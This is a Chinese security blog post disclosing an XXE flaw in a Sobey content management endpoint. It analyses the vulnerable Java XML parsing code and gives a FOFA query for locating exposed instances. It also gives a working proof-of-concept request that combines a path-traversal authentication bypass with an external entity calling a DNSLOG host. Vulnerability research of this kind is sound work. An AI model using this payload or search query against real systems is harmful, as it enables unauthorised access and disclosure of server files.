---
title: "索贝内容管理系统 /sobey-mchEditor/mch/AIInt/AITaskBack XML外部实体注入(XXE)漏洞"
source: https://mrxn.net/jswz/sobey-AIInt-AITaskBack-xxe.html
asset_dir: assets/索贝内容管理系统-sobey-mcheditormchaiintaitaskback-xml外部实体注入(xxe)漏洞
---

# 索贝内容管理系统 /sobey-mchEditor/mch/AIInt/AITaskBack XML外部实体注入(XXE)漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/19 08:20
* 718浏览
* [0评论](#comment)
* 24分钟阅读

深入探索

网络安全课程

SQL注入检测工具

计算机安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝 /sobey-mchEditor/mch/AIInt/AITaskBack 接口存在XML外部实体注入（[XXE](https://mrxn.net/tag/XXE)）漏洞。攻击者可以通过构造恶意的XML数据包，利用该漏洞读取服务器上的敏感文件或发起其他恶意操作，可能导致敏感信息泄露。

代码安全审计

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞通告，搜索漏洞路由 `mch/AIInt/AITaskBack`

[![索贝内容管理系统 /sobey-mchEditor/mch/AIInt/AITaskBack XML外部实体注入(XXE)漏洞](images/img-001-5808e99f31ff.webp)](https://image.mrxn.net/192cc5f00a9c486c8106577642f5fbbc.webp)

直接进入看它的实现逻辑如下

漏洞预警服务

```
@RequestMapping(
    value = {"/AITaskBack"},
    method = {RequestMethod.POST}
)
public Response AITaskBack(HttpServletRequest req, @RequestParam("contentid") String contentid, @RequestParam(value = "token",required = false) String token, @RequestParam(value = "siteCode",required = false) String siteCode) throws HttpException, IOException {
    Response response = new Response();
    response.setStatus(200);
    HiveService hive = new HiveServiceImpl();
    String param = IOUtils.toString(req.getInputStream(), "UTF-8");
    logger.info("AI智能写稿回调参数为:" + param);
    int aiFlg = 2;

    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        StringReader sr = new StringReader(param);
        InputSource iss = new InputSource(sr);
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(iss);
        NodeList dogList = doc.getElementsByTagName("TextResult");
        Node dog = dogList.item(0);
        String result = dog.getFirstChild().getNodeValue();
        JSONObject ret = JSONObject.fromObject(result);
        if (!ret.containsKey("code") || ret.getInt("code") != 200) {
            logger.error("智能服务回调返回失败：" + result);
            aiFlg = 0;
        }

        JSONArray results = ret.getJSONArray("results");
```

漏洞的根源在于变量 `param`，其值直接来自 `req.getInputStream()`，是攻击者可以完全控制的 HTTP 请求体。然后通过 `DocumentBuilderFactory.newInstance()` 获取一个工厂实例。这个方法返回的是 JAXP（Java API for XML Processing）规范的一个具体实现，通常是 JRE 中内置的 Xerces 解析器。在未进行安全配置的情况下，其行为取决于 JRE 的版本和系统环境的默认设置。在许多 Java 环境中（尤其是 Java 8 早期版本及更早版本），**默认是允许解析外部实体的**，这是一种不安全的设计。代码将安全性寄希望于运行环境的默认配置，而不是在代码层面强制实施安全策略，这是本次[XXE漏洞](https://mrxn.net/tag/XXE)产生的根本原因。

# 漏洞复现

> 权限绕过相关分析可以参考之前的 [索贝融媒体 getList SQL注入漏洞](https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html) 的权限校验部分
>
> 安全研究工具

```
POST /sobey-mchEditor/js/%2e%2e/mch/AIInt/AITaskBack?contentid=1&token=&siteCode= HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://xxe.dnslog.pt/xxe_test">
]>
<root>
  <TextResult>&xxe;</TextResult>
</root>
```

[![索贝内容管理系统 /sobey-mchEditor/mch/AIInt/AITaskBack XML外部实体注入(XXE)漏洞](images/img-002-a8897d7d0092.webp)](https://image.mrxn.net/18d27f54e6c94226a1a6d453ad5a78ef.webp)

成功在DNSLOG平台收到DNS和HTTP请求

漏洞预警服务

* 标签：
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝内容管理系统 /sobey-mchEditor/mch/AIInt/AITaskBack XML外部实体注入(XXE)漏洞](https://mrxn.net/jswz/sobey-AIInt-AITaskBack-xxe.html)  
文章链接：<https://mrxn.net/jswz/sobey-AIInt-AITaskBack-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-AIInt-AITaskBack-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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